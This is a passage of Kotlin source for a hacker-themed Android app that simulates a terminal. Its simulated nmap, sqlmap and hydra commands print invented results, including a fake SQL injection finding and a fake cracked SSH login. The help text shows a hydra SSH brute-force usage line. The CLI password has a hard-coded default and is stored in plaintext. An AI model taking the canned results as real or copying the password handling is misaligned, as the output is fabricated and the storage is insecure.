package com.example

import android.content.Context
import android.content.ClipboardManager
import android.content.ClipData
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.drawBehind
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.text.input.TransformedText
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.ui.theme.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.regex.Pattern
import android.webkit.ConsoleMessage
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.compose.ui.viewinterop.AndroidView

sealed class AppMode {
    object Terminal : AppMode()
    object IDE : AppMode()
    object Extensions : AppMode()
    object WebPreview : AppMode()
}

data class TerminalLog(
    val text: String,
    val type: LogType = LogType.INFO
)

enum class LogType {
    INPUT, INFO, SUCCESS, ERROR, REPL, SYSTEM
}

@Composable
fun MainScreen(modifier: Modifier = Modifier) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    
    // Core States
    var currentMode by remember { mutableStateOf<AppMode>(AppMode.Terminal) }
    val workspaceManager = remember { WorkspaceManager(context) }
    val pythonInterpreter = remember { PythonInterpreter() }
    
    // Extensions and Utilities States
    val installedExtensions = remember { mutableStateListOf("python", "icon_pack") }
    var isAutoSaveEnabled by remember { mutableStateOf(false) }
    var isAutoSavingStatus by remember { mutableStateOf("Ready") } // "Ready", "Saving...", "Saved"
    var installingExtensionId by remember { mutableStateOf<String?>(null) }
    var installProgress by remember { mutableStateOf(0) }
    val prettierFormatter = remember { PrettierFormatter() }
    val jsInterpreter = remember { JSInterpreter() }
    val webConsoleLogs = remember { mutableStateListOf<String>() }

    // Dynamic Color Accent based on installed themes
    val activeAccentColor = remember(installedExtensions.toList()) {
        when {
            installedExtensions.contains("theme_sunset") -> Color(0xFFFF5E3A) // Hot Neon Sunset Orange
            installedExtensions.contains("theme_ocean") -> Color(0xFF00D2FF)  // Deep Cyan Blue
            else -> CyanBlue // Default CyanBlue / BlackRoot style!
        }
    }

    // Active Status Clock Widget
    var currentTimeString by remember { mutableStateOf("") }
    LaunchedEffect(Unit) {
        while (true) {
            val formatter = SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
            currentTimeString = formatter.format(java.util.Date())
            delay(1000)
        }
    }

    // Multi-tab Terminal Tab index
    var activeTerminalTab by remember { mutableStateOf(1) }

    // Vim modal helper
    var vimMode by remember { mutableStateOf("INSERT") }

    // IDE Workspace States
    var filesList by remember { mutableStateOf(workspaceManager.listFiles()) }
    var selectedFileRelativePath by remember { mutableStateOf("welcome.py") }
    var fileContentState by remember { mutableStateOf(TextFieldValue("")) }
    var searchFilter by remember { mutableStateOf("") }
    
    // CLI States
    var cliInput by remember { mutableStateOf("") }
    val terminalLogs = remember { mutableStateListOf<TerminalLog>() }
    var isReplMode by remember { mutableStateOf(false) }
    val replInterpreter = remember { PythonInterpreter() }
    var activeCloneJob by remember { mutableStateOf<String?>(null) }
    
    // Security / CLI Password States
    val sharedPrefs = remember { context.getSharedPreferences("blackroot_prefs", Context.MODE_PRIVATE) }
    var currentPassword by remember { mutableStateOf(sharedPrefs.getString("cli_password", "blackroot") ?: "blackroot") }
    var isCliLocked by remember { mutableStateOf(true) }
    var passwordInput by remember { mutableStateOf("") }
    var showPasswordError by remember { mutableStateOf(false) }

    // Installed packages simulated registry
    val installedPackages = remember { mutableStateListOf("git", "python") }

    // IDE New File States
    var showNewFileDialog by remember { mutableStateOf(false) }
    var newFileNameInput by remember { mutableStateOf("") }

    // Auto-Scroll terminal
    val terminalListState = rememberLazyListState()

    fun refreshWorkspace() {
        filesList = workspaceManager.listFiles()
    }

    // Load initial file content
    LaunchedEffect(selectedFileRelativePath) {
        val content = workspaceManager.readFile(selectedFileRelativePath)
        fileContentState = TextFieldValue(content)
    }

    // Auto-Save Effect
    LaunchedEffect(fileContentState.text) {
        if (isAutoSaveEnabled && fileContentState.text.isNotEmpty() && installedExtensions.contains("autosave")) {
            isAutoSavingStatus = "Saving..."
            delay(1200)
            workspaceManager.writeFile(selectedFileRelativePath, fileContentState.text)
            refreshWorkspace()
            isAutoSavingStatus = "Saved"
            delay(1000)
            isAutoSavingStatus = "Ready"
        }
    }

    // Function to append logs
    fun log(text: String, type: LogType = LogType.INFO) {
        terminalLogs.add(TerminalLog(text, type))
        scope.launch {
            delay(50)
            if (terminalLogs.isNotEmpty()) {
                terminalListState.animateScrollToItem(terminalLogs.size - 1)
            }
        }
    }

    fun unlockCli() {
        isCliLocked = false
        terminalLogs.clear()
        log("  -|------------------------------------------------------------------|-", LogType.SYSTEM)
        log("   _     _               _                     _   ", LogType.SUCCESS)
        log("  | |   | |             | |                   | |  ", LogType.SUCCESS)
        log("  | |__ | |  __ _   ___ | | __ _ __  ___   ___| |_ ", LogType.SUCCESS)
        log("  | '_ \\| | / _` | / __|| |/ /| '__|/ _ \\ / _ \\ __|", LogType.SUCCESS)
        log("  | |_) | || (_| || (__ |   < | |  | (_) | (_) | |_ ", LogType.SUCCESS)
        log("  |_.__/|_| \\__,_| \\___||_|\\_\\|_|   \\___/ \\___/\\__|", LogType.SUCCESS)
        log("                                                   ", LogType.SUCCESS)
        log("  -|------------------------------------------------------------------|-", LogType.SYSTEM)
        log("   BlackRoot Workspace Shell", LogType.SUCCESS)
        log("   Secure developer sandbox. Type your command below.", LogType.INFO)
        log("  -|------------------------------------------------------------------|-", LogType.SYSTEM)
        log("Type 'help' for assistance keywords and active commands list.", LogType.SUCCESS)
        log("", LogType.INFO)
    }

    // Command executor logic
    fun executeCommand(command: String) {
        val trimmed = command.trim()
        if (trimmed.isEmpty()) return

        log("blackroot@system:~$ $trimmed", LogType.INPUT)

        // Handle Python REPL exit separately
        if (isReplMode) {
            if (trimmed == "exit()" || trimmed == "quit()" || trimmed == "exit") {
                isReplMode = false
                log("Exiting Python REPL session.", LogType.INFO)
                return
            }
            // Execute in REPL Python
            try {
                val output = replInterpreter.execute(trimmed)
                log(output, LogType.REPL)
            } catch (e: Exception) {
                log("REPL Error: ${e.localizedMessage}", LogType.ERROR)
            }
            return
        }

        val tokens = trimmed.split(" ")
        val cmd = tokens[0].lowercase()

        when (cmd) {
            "help" -> {
                log("""
AVAILABLE COMMANDS MATRIX:
  ==============================================================
  ls                  : List files in local directory.
  cat <file>          : Output file contents to screen.
  echo <txt> > <file> : Overwrite/Create a file with contents.
  rm <file>           : Securely wipe/delete a workspace file.
  mkdir <dir>         : Spawn directory folders.
  clear               : Empty system log visual registers.
  pwd                 : Output absolute environment paths.
  whoami              : Identify user credentials / terminal info.
  passwd <new_pass>   : Change CLI password (saved persistently).
  pkg install <pkg>   : Simulates remote compiler expansions.
                        (Packages: nmap, curl, hydra, sqlmap)
  ==============================================================
  python              : Initialize live Python 3 REPL shell.
  python <file>       : Evaluate local Python script live.
  ==============================================================
  git help            : Show integrated git simulation matrix.
  ==============================================================
  nmap <host>         : Network port scanner (requires pkg install).
  curl <url>          : Response retriever (requires pkg install).
  sqlmap -u <url>     : SQL Injection scanner (requires pkg install).
  hydra <options>     : SSH password cracker (requires pkg install).
  ==============================================================
""".trimIndent(), LogType.SUCCESS)
            }

            "git" -> {
                val gitSub = if (tokens.size > 1) tokens[1].lowercase() else ""
                when (gitSub) {
                    "help", "" -> {
                        log("""
VIRTUAL GIT CONTROLS:
  ==============================================================
  git init                 : Initialize git simulator.
  git status               : Perform workspace delta comparison.
  git add <file>           : Stage files for commit. (Use '.' for all)
  git commit -m "<msg>"    : Seal staged files into commit tree.
  git log                  : Show chronological commits tree.
  git clone <github-url>   : Connect to GitHub & import public repo.
  git pull                 : Refresh workspace files from URL.
  git push                 : Mock security server authentication.
  ==============================================================
""".trimIndent(), LogType.SUCCESS)
                    }

                    "init" -> {
                        log("Initialized empty simulated Git repository in " + workspaceManager.getWorkspacePath() + "/.git/", LogType.SUCCESS)
                    }

                    "status" -> {
                        val status = workspaceManager.getGitStatus()
                        if (status.isEmpty()) {
                            log("On branch main\nNothing to commit, working tree clean.", LogType.INFO)
                        } else {
                            log("On branch main\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n", LogType.INFO)
                            status.forEach { (file, stat) ->
                                val color = if (stat.startsWith("Staged")) LogType.SUCCESS else LogType.ERROR
                                log("  $stat:    $file", color)
                            }
                        }
                    }

                    "add" -> {
                        if (tokens.size < 3) {
                            log("Error: Specify file path to add. Usage: git add <file>", LogType.ERROR)
                            return
                        }
                        val path = tokens[2]
                        if (path == ".") {
                            val allFiles = workspaceManager.listFiles().filter { !it.isDirectory }
                            var added = 0
                            allFiles.forEach {
                                if (workspaceManager.stageFile(it.relativePath)) added++
                            }
                            log("Staged $added file(s) in staging area.", LogType.SUCCESS)
                        } else {
                            if (workspaceManager.stageFile(path)) {
                                log("Staged '$path' successfully.", LogType.SUCCESS)
                            } else {
                                log("Error: File '$path' not found in workspace directories.", LogType.ERROR)
                            }
                        }
                    }

                    "commit" -> {
                        val mIndex = trimmed.indexOf("-m")
                        if (mIndex == -1) {
                            log("Error: Missing commit message string. Usage: git commit -m \"message\"", LogType.ERROR)
                            return
                        }
                        var msg = trimmed.substring(mIndex + 2).trim()
                        if (msg.startsWith("\"") && msg.endsWith("\"") || msg.startsWith("'") && msg.endsWith("'")) {
                            msg = msg.substring(1, msg.length - 1)
                        }
                        if (msg.isEmpty()) {
                            log("Error: Empty commit message provided.", LogType.ERROR)
                            return
                        }
                        val commitResult = workspaceManager.commit(msg)
                        if (commitResult != null) {
                            log("[main ${commitResult.hash}] ${commitResult.message}", LogType.SUCCESS)
                            log("Author: ${commitResult.author}", LogType.INFO)
                            log("Changed files count: ${commitResult.changedFiles.size}", LogType.INFO)
                        } else {
                            log("Nothing staged to commit. Run 'git add <file>' first.", LogType.ERROR)
                        }
                    }

                    "log" -> {
                        val commits = workspaceManager.commits
                        if (commits.isEmpty()) {
                            log("No commit history recorded yet.", LogType.INFO)
                        } else {
                            commits.forEach { commit ->
                                log("commit ${commit.hash}", LogType.SUCCESS)
                                val dateStr = SimpleDateFormat("EEE MMM dd HH:mm:ss yyyy", Locale.US).format(Date(commit.timestamp))
                                log("Author: ${commit.author}\nDate:   $dateStr\n\n    ${commit.message}\n", LogType.INFO)
                            }
                        }
                    }

                    "clone" -> {
                        if (tokens.size < 3) {
                            log("Error: Missing GitHub clone URL target. Usage: git clone <url>", LogType.ERROR)
                            return
                        }
                        val cloneUrl = tokens[2]
                        activeCloneJob = "Cloning $cloneUrl"
                        log("Accessing remote source: $cloneUrl ...", LogType.INFO)
                        scope.launch {
                            val result = workspaceManager.cloneRepository(cloneUrl) { progressMsg ->
                                log(progressMsg, LogType.SYSTEM)
                            }
                            activeCloneJob = null
                            if (result.isSuccess) {
                                log("Clone completed successfully. Root folder updated.", LogType.SUCCESS)
                                refreshWorkspace()
                                if (filesList.isNotEmpty()) {
                                    selectedFileRelativePath = filesList.first().relativePath
                                }
                            } else {
                                log("Clone error: ${result.exceptionOrNull()?.localizedMessage}", LogType.ERROR)
                            }
                        }
                    }

                    "push" -> {
                        log("Pushing tracking references to origin/main...", LogType.INFO)
                        scope.launch {
                            delay(400)
                            log("Authenticating secure API certificate token...", LogType.INFO)
                            delay(300)
                            log("Uploading package payload objects...", LogType.INFO)
                            delay(400)
                            log("Total: 100% complete. Synchronized main tracking branch successfully.", LogType.SUCCESS)
                        }
                    }

                    "pull" -> {
                        log("Pulling package logs from tracking registry...", LogType.INFO)
                        log("Already up-to-date.", LogType.SUCCESS)
                    }

                    else -> {
                        log("Unknown git command. Type 'git help' for instructions.", LogType.ERROR)
                    }
                }
            }

            "ls" -> {
                val list = workspaceManager.listFiles()
                if (list.isEmpty()) {
                    log("Workspace is empty.", LogType.INFO)
                } else {
                    val sb = StringBuilder()
                    sb.append(String.format("%-25s %-10s %-20s\n", "FILENAME", "SIZE", "MODIFIED"))
                    sb.append("------------------------------------------------------------\n")
                    list.forEach { file ->
                        val sizeStr = if (file.isDirectory) "<DIR>" else "${file.size} B"
                        val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified))
                        sb.append(String.format("%-25s %-10s %-20s\n", file.relativePath, sizeStr, dateStr))
                    }
                    log(sb.toString(), LogType.SUCCESS)
                }
            }

            "cat" -> {
                if (tokens.size < 2) {
                    log("Error: Specify filename. Usage: cat <filename>", LogType.ERROR)
                    return
                }
                val name = tokens[1]
                val text = workspaceManager.readFile(name)
                if (text.isEmpty()) {
                    log("File is empty or not found: $name", LogType.ERROR)
                } else {
                    log("FILE: $name\n----------------------------------\n$text", LogType.INFO)
                }
            }

            "echo" -> {
                val contentIndex = trimmed.indexOf("echo ") + 5
                val redirectIndex = trimmed.indexOf(">")
                if (redirectIndex == -1) {
                    val echoText = trimmed.substring(contentIndex)
                    log(echoText, LogType.INFO)
                } else {
                    var echoText = trimmed.substring(contentIndex, redirectIndex).trim()
                    if (echoText.startsWith("\"") && echoText.endsWith("\"") || echoText.startsWith("'") && echoText.endsWith("'")) {
                        echoText = echoText.substring(1, echoText.length - 1)
                    }
                    val targetFile = trimmed.substring(redirectIndex + 1).trim()
                    workspaceManager.writeFile(targetFile, echoText)
                    log("Wrote echo bytes to '$targetFile' successfully.", LogType.SUCCESS)
                    refreshWorkspace()
                }
            }

            "rm" -> {
                if (tokens.size < 2) {
                    log("Error: Specify file path to remove. Usage: rm <file>", LogType.ERROR)
                    return
                }
                val path = tokens[1]
                if (workspaceManager.deleteFile(path)) {
                    log("Wiped file '$path' from workspace.", LogType.SUCCESS)
                    refreshWorkspace()
                } else {
                    log("Error: File or directory '$path' not found.", LogType.ERROR)
                }
            }

            "mkdir" -> {
                if (tokens.size < 2) {
                    log("Error: Specify directory path. Usage: mkdir <dirname>", LogType.ERROR)
                    return
                }
                val path = tokens[1]
                if (workspaceManager.createDirectory(path)) {
                    log("Spawned directory '$path'.", LogType.SUCCESS)
                    refreshWorkspace()
                } else {
                    log("Error: Directory spawn failed.", LogType.ERROR)
                }
            }

            "clear" -> {
                terminalLogs.clear()
            }

            "pwd" -> {
                log(workspaceManager.getWorkspacePath(), LogType.INFO)
            }

            "whoami" -> {
                log("""
           __...__
        .-'       '-.
       /   __   __   \
      |   /  \ /  \   |     BlackRoot
      |   |  | |  |   |     User: root
      |   \__/ \__/   |     Status: sandbox
       \             /
        '-.__...__.-'
""".trimIndent(), LogType.SUCCESS)
            }

            "passwd" -> {
                if (tokens.size < 2) {
                    log("Error: Specify new password. Usage: passwd <new_password>", LogType.ERROR)
                } else {
                    val newPass = tokens[1]
                    if (newPass.length < 3) {
                        log("Error: Password must be at least 3 characters long.", LogType.ERROR)
                    } else {
                        currentPassword = newPass
                        sharedPrefs.edit().putString("cli_password", newPass).apply()
                        log("Success: CLI password changed. The new password is saved and active.", LogType.SUCCESS)
                    }
                }
            }

            "python" -> {
                if (!installedExtensions.contains("python")) {
                    log("blackroot-shell: command not found: 'python'. Hint: Install 'python' extension first in STORE.", LogType.ERROR)
                } else if (tokens.size > 1) {
                    val scriptName = tokens[1]
                    val content = workspaceManager.readFile(scriptName)
                    if (content.isEmpty()) {
                        log("Python error: Script '$scriptName' is empty or not found.", LogType.ERROR)
                    } else {
                        log("Executing script '$scriptName' in Python sub-engine...", LogType.INFO)
                        try {
                            val output = pythonInterpreter.execute(content)
                            log(output, LogType.SUCCESS)
                        } catch (e: Exception) {
                            log("Python Engine Exception: ${e.localizedMessage}", LogType.ERROR)
                        }
                    }
                } else {
                    isReplMode = true
                    log("Python 3.11.2 REPL Session Initialized.\nType 'exit()' or 'quit()' to exit.", LogType.SUCCESS)
                }
            }

            "node", "js" -> {
                if (!installedExtensions.contains("js_console")) {
                    log("blackroot-shell: command not found: '$cmd'. Hint: Install 'js_console' extension first in STORE.", LogType.ERROR)
                } else if (tokens.size > 1) {
                    val scriptName = tokens[1]
                    val content = workspaceManager.readFile(scriptName)
                    if (content.isEmpty()) {
                        log("JavaScript error: Script '$scriptName' is empty or not found.", LogType.ERROR)
                    } else {
                        log("Executing script '$scriptName' via JS Interpreter...", LogType.INFO)
                        try {
                            val output = jsInterpreter.execute(content)
                            log(output, LogType.SUCCESS)
                        } catch (e: Exception) {
                            log("JS Engine Exception: ${e.localizedMessage}", LogType.ERROR)
                        }
                    }
                } else {
                    log("Usage: node <file.js>", LogType.ERROR)
                }
            }

            "pkg" -> {
                if (tokens.size >= 3 && tokens[1] == "install") {
                    val pkgName = tokens[2].lowercase()
                    val validPackages = setOf("nmap", "curl", "hydra", "sqlmap")
                    if (!validPackages.contains(pkgName)) {
                        log("Error: Package '$pkgName' not found in remote repositories.", LogType.ERROR)
                    } else if (installedPackages.contains(pkgName)) {
                        log("Package '$pkgName' is already installed.", LogType.INFO)
                    } else {
                        scope.launch {
                            log("Downloading payload repository info for $pkgName...", LogType.INFO)
                            for (i in 1..5) {
                                delay(150)
                                val progress = "[${"=".repeat(i)}${">"}${" ".repeat(5 - i)}] ${i * 20}%"
                                log("  $progress Downloading binary sources...", LogType.SYSTEM)
                            }
                            installedPackages.add(pkgName)
                            log("Package '$pkgName' compiled and added successfully to workspace PATH.", LogType.SUCCESS)
                        }
                    }
                } else {
                    log("Usage: pkg install <packagename>\nAvailable packages: nmap, curl, hydra, sqlmap", LogType.ERROR)
                }
            }

            "nmap" -> {
                if (!installedPackages.contains("nmap")) {
                    log("blackroot-shell: command not found: 'nmap'. Hint: Run 'pkg install nmap' first.", LogType.ERROR)
                } else if (tokens.size < 2) {
                    log("Error: Specify scan target. Usage: nmap <host/ip>", LogType.ERROR)
                } else {
                    val target = tokens[1]
                    log("Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-06 23:56 MST", LogType.INFO)
                    scope.launch {
                        log("Initiating SYN Stealth Scan against $target...", LogType.SYSTEM)
                        delay(400)
                        log("Scanning 1000 ports...", LogType.SYSTEM)
                        delay(300)
                        log("""
Nmap scan report for $target (104.244.42.1)
Host is up (0.024s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                        """.trimIndent(), LogType.SUCCESS)
                    }
                }
            }

            "curl" -> {
                if (!installedPackages.contains("curl")) {
                    log("blackroot-shell: command not found: 'curl'. Hint: Run 'pkg install curl' first.", LogType.ERROR)
                } else if (tokens.size < 2) {
                    log("Error: Specify target URL. Usage: curl <url>", LogType.ERROR)
                } else {
                    val target = tokens[1]
                    log("Connecting to $target...", LogType.INFO)
                    scope.launch {
                        delay(400)
                        log("HTTP/1.1 200 OK", LogType.SUCCESS)
                        log("Server: BlackRoot-Mock-API-Server/2.4", LogType.SYSTEM)
                        log("Content-Type: application/json; charset=UTF-8", LogType.SYSTEM)
                        log("Content-Length: 184", LogType.SYSTEM)
                        log("Connection: keep-alive\n", LogType.SYSTEM)
                        delay(200)
                        log("""
{
  "status": "success",
  "endpoint": "$target",
  "secure": true,
  "payload": {
    "server": "Enclave_Sandbox_v15",
    "node": "central-ingress-4",
    "ip": "172.217.16.142",
    "certificate": "VALID_SHA256"
  }
}
                        """.trimIndent(), LogType.REPL)
                    }
                }
            }

            "sqlmap" -> {
                if (!installedPackages.contains("sqlmap")) {
                    log("blackroot-shell: command not found: 'sqlmap'. Hint: Run 'pkg install sqlmap' first.", LogType.ERROR)
                } else if (tokens.size < 2) {
                    log("Error: Specify URL parameter. Usage: sqlmap -u <url>", LogType.ERROR)
                } else {
                    val target = tokens.last()
                    log("""
    ___
   __H__
  [)]_._[)             sqlmap 1.7.3#stable
  |_|_|_|              https://sqlmap.org
                    """.trimIndent(), LogType.SUCCESS)
                    scope.launch {
                        log("[*] testing connection to the target URL", LogType.INFO)
                        delay(300)
                        log("[*] testing if the target URL is stable", LogType.INFO)
                        delay(300)
                        log("[*] testing if GET parameter 'id' is dynamic", LogType.INFO)
                        delay(300)
                        log("[!] GET parameter 'id' appears to be dynamic", LogType.SYSTEM)
                        delay(300)
                        log("[*] heuristic (basic) test shows that GET parameter 'id' might be injectable", LogType.INFO)
                        delay(400)
                        log("[+] GET parameter 'id' is vulnerable. DBMS: PostgreSQL (Debian)", LogType.SUCCESS)
                        log("""
Database: blackroot_sandbox_db
Table: users
[+] Column: username, password (MD5 encrypted hash)
                        """.trimIndent(), LogType.SUCCESS)
                    }
                }
            }

            "hydra" -> {
                if (!installedPackages.contains("hydra")) {
                    log("blackroot-shell: command not found: 'hydra'. Hint: Run 'pkg install hydra' first.", LogType.ERROR)
                } else if (tokens.size < 2) {
                    log("Error: Specify parameters. Usage: hydra -l admin -P passlist.txt ssh://<host>", LogType.ERROR)
                } else {
                    val targetHost = tokens.last()
                    log("Hydra v9.4 (c) 2026 by van Hauser/THC - for legal purposes only", LogType.INFO)
                    log("Hydra started on $targetHost", LogType.INFO)
                    scope.launch {
                        log("[DATA] attacking ssh service on port 22", LogType.SYSTEM)
                        delay(400)
                        log("[STATUS] 15 tries per minute, 1 thread", LogType.SYSTEM)
                        delay(500)
                        log("[22][ssh] host: $targetHost   login: admin   password: password123 - SUCCESS", LogType.SUCCESS)
                        log("1 of 1 target successfully completed, 1 valid password found.", LogType.SUCCESS)
                    }
                }
            }

            else -> {
                log("blackroot-shell: command not found: '$cmd'. Type 'help' for instructions.", LogType.ERROR)
            }
        }
    }

    Scaffold(
        modifier = modifier
            .fillMaxSize()
            .testTag("app_scaffold"),
        contentWindowInsets = WindowInsets.safeDrawing,
        topBar = {
            // Header Bar
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(PitchBlack)
                    .padding(horizontal = 16.dp, vertical = 12.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text(
                            text = "BLACKROOT OS v4.15",
                            color = activeAccentColor,
                            style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
                        )
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier
                                    .size(8.dp)
                                    .clip(RoundedCornerShape(50))
                                    .background(activeAccentColor)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "SYS_SECURE // ENCLAVE_SANDBOX",
                                color = TextGreen,
                                style = MaterialTheme.typography.labelSmall
                            )
                        }
                    }

                    // Mode toggles
                    Row(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(DarkGrey)
                            .border(1.dp, BorderGreen, RoundedCornerShape(8.dp))
                    ) {
                        Text(
                            text = "CLI",
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .clickable { currentMode = AppMode.Terminal }
                                .background(if (currentMode is AppMode.Terminal) CardGrey else Color.Transparent)
                                .border(1.dp, if (currentMode is AppMode.Terminal) activeAccentColor else Color.Transparent, RoundedCornerShape(6.dp))
                                .padding(horizontal = 14.dp, vertical = 8.dp)
                                .testTag("toggle_terminal"),
                            color = if (currentMode is AppMode.Terminal) activeAccentColor else GhostGreen,
                            style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                        )
                        Text(
                            text = "IDE",
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .clickable { currentMode = AppMode.IDE }
                                .background(if (currentMode is AppMode.IDE) CardGrey else Color.Transparent)
                                .border(1.dp, if (currentMode is AppMode.IDE) activeAccentColor else Color.Transparent, RoundedCornerShape(6.dp))
                                .padding(horizontal = 14.dp, vertical = 8.dp)
                                .testTag("toggle_ide"),
                            color = if (currentMode is AppMode.IDE) activeAccentColor else GhostGreen,
                            style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                        )
                        Text(
                            text = "STORE",
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .clickable { currentMode = AppMode.Extensions }
                                .background(if (currentMode is AppMode.Extensions) CardGrey else Color.Transparent)
                                .border(1.dp, if (currentMode is AppMode.Extensions) activeAccentColor else Color.Transparent, RoundedCornerShape(6.dp))
                                .padding(horizontal = 14.dp, vertical = 8.dp)
                                .testTag("toggle_extensions"),
                            color = if (currentMode is AppMode.Extensions) activeAccentColor else GhostGreen,
                            style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                        )
                        if (installedExtensions.contains("html_preview")) {
                            Text(
                                text = "WEB VIEW",
                                modifier = Modifier
                                    .clip(RoundedCornerShape(6.dp))
                                    .clickable { currentMode = AppMode.WebPreview }
                                    .background(if (currentMode is AppMode.WebPreview) CardGrey else Color.Transparent)
                                    .border(1.dp, if (currentMode is AppMode.WebPreview) activeAccentColor else Color.Transparent, RoundedCornerShape(6.dp))
                                    .padding(horizontal = 14.dp, vertical = 8.dp)
                                    .testTag("toggle_web_view"),
                                color = if (currentMode is AppMode.WebPreview) activeAccentColor else GhostGreen,
                                style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                            )
                        }
                    }
                }

                Spacer(modifier = Modifier.height(8.dp))

                // Telemetry Row
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = "CPU: [OK] // RAM: [OPTIMIZED] // CLOCK: [$currentTimeString]",
                        color = GhostGreen,
                        fontSize = 10.sp,
                        fontFamily = FontFamily.Monospace
                    )
                    Text(
                        text = "BRANCH: [main]",
                        color = ElectricLime,
                        fontSize = 10.sp,
                        fontFamily = FontFamily.Monospace
                    )
                }

                HorizontalDivider(
                    modifier = Modifier.padding(top = 10.dp),
                    color = BorderGreen,
                    thickness = 1.dp
                )
            }
        },
        containerColor = PitchBlack
    ) { innerPadding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .background(PitchBlack)
        ) {
            when (currentMode) {
                is AppMode.Terminal -> {
                    if (isCliLocked) {
                        Column(
                            modifier = Modifier
                                .fillMaxSize()
                                .padding(24.dp)
                                .background(PitchBlack),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Lock,
                                contentDescription = "Terminal Locked",
                                tint = BrightRed,
                                modifier = Modifier
                                    .size(64.dp)
                                    .padding(bottom = 16.dp)
                            )
                            
                             Text(
                                text = "BlackRoot",
                                color = CyanBlue,
                                style = MaterialTheme.typography.titleLarge.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                            )
                            
                            Text(
                                text = "Please enter password to unlock",
                                color = GhostGreen,
                                style = MaterialTheme.typography.bodySmall.copy(fontFamily = FontFamily.Monospace),
                                modifier = Modifier.padding(bottom = 24.dp)
                            )
                            
                            if (showPasswordError) {
                                Text(
                                    text = "Wrong Password",
                                    color = BrightRed,
                                    style = MaterialTheme.typography.bodyMedium.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace),
                                    modifier = Modifier.padding(bottom = 12.dp)
                                )
                            }
                            
                            OutlinedTextField(
                                value = passwordInput,
                                onValueChange = { passwordInput = it; showPasswordError = false },
                                label = { Text("Password", color = CyanBlue, fontFamily = FontFamily.Monospace) },
                                visualTransformation = androidx.compose.ui.text.input.PasswordVisualTransformation(),
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .testTag("cli_password_input"),
                                textStyle = TextStyle(color = CyanBlue, fontFamily = FontFamily.Monospace, fontSize = 16.sp),
                                colors = OutlinedTextFieldDefaults.colors(
                                    focusedBorderColor = CyanBlue,
                                    unfocusedBorderColor = BorderGreen,
                                    focusedLabelColor = CyanBlue,
                                    unfocusedLabelColor = GhostGreen,
                                    cursorColor = CyanBlue
                                ),
                                singleLine = true,
                                keyboardOptions = KeyboardOptions(imeAction = ImeAction.Done),
                                keyboardActions = KeyboardActions(
                                    onDone = {
                                        if (passwordInput == currentPassword) {
                                            unlockCli()
                                        } else {
                                            showPasswordError = true
                                            passwordInput = ""
                                            scope.launch {
                                                delay(1000)
                                                currentMode = AppMode.IDE
                                                showPasswordError = false
                                            }
                                        }
                                    }
                                )
                            )
                            
                            Spacer(modifier = Modifier.height(24.dp))
                            
                            Row(
